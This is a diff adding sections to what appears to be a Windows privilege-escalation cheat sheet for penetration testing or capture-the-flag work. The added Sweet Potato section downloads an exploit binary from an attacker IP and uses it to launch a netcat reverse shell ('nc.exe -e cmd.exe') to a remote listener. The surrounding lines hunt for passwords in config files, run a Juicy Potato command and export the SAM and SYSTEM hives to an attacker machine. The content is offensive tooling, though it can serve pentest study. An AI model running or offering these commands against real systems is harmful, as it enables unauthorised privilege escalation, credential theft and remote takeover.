@@ -588,6 +588,13 @@ findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
 findstr /spin "password" *.*
 ```
 
+### User privileges
+```
+whoami /priv
+
+IF SEImpersonate Privilege is enababled THEN perform sweet potato exploit
+```
+
 ### Search history ConsoleHost_history.txt
 ```
 C:\users\USERNAME\Appdata\Roaming\Microsoft\Windows\Powershell\PSReadline\
@@ -834,6 +841,15 @@ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 '\juicypotato.exe -t * -p shell.bat -l 4545 -c "CLSID" 4545'
 ```
 
+### Sweet Potato
+https://github.com/uknowsec/SweetPotato/blob/master/README.md
+```
+powershell iwr http://10.8.0.24/SweetPotato.exe -outfile .\potato.exe
+.\potato.exe -a "C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.8.0.x 443"
+
+Connect using a listener on kali
+
+```
 ### Export SAM and SYSTEM file to kali machine
 ```
 impacket-smbserver share -smb2support -username USER -password PASS
